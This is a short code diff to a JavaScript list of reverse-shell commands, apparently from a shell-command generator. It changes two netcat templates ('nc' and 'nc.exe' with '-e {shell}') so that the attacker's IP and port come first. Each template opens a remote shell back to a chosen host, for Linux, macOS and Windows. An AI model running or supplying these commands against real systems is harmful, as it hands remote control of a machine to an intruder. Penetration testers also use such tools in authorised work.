@@ -52,12 +52,12 @@ const reverseShellCommands = withCommandType(
         },
         {
             "name": "nc -e",
-            "command": "nc -e {shell} {ip} {port}",
+            "command": "nc {ip} {port} -e {shell}",
             "meta": ["linux", "mac"]
         },
         {
             "name": "nc.exe -e",
-            "command": "nc.exe -e {shell} {ip} {port}",
+            "command": "nc.exe {ip} {port} -e {shell}",
             "meta": ["windows"]
         },
         {
